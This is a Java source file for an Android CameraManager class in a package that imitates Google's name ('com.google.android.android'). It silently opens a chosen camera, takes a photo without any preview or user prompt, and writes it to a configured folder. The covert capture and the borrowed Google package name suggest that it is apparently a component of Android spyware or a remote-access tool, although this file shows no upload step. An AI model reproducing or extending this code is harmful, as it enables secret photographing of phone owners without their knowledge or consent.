package com.google.android.android;

import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Environment;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class CameraManager {

    public int getNumberOfCameras() {
        return Camera.getNumberOfCameras();
    }

    public void takePicture(Long cameraType) {
        Camera camera = getCameraInstance(cameraType.intValue());
        if (camera == null) return;
        camera.startPreview();
        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yy HH:mm:ss");
                Calendar calendar = Calendar.getInstance();
                String fileName = Config.PHOTOS_PATH + "photo ";
                fileName += simpleDateFormat.format(calendar.getTime()) + ".jpg";
                File pictureFile = new File(fileName);
                try {
                    FileOutputStream fos = new FileOutputStream(pictureFile);
                    fos.write(data);
                    fos.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        try {
            Thread.sleep(2_000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        camera.release();
    }

    /** A safe way to get an instance of the Camera object. */
    private Camera getCameraInstance(int cameraType){
        Camera camera = null;
        try {
            camera = Camera.open(cameraType); // attempt to get a Camera instance
        }
        catch (Exception e){
            // Camera is not available (in use or does not exist)
            e.printStackTrace();
        }
        return camera; // returns null if camera is unavailable
    }

    /** Check if this device has a camera */
    private boolean checkCameraHardware(Context context) {
        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
            // this device has a camera
            return true;
        } else {
            // no camera on this device
            return false;
        }
    }

}
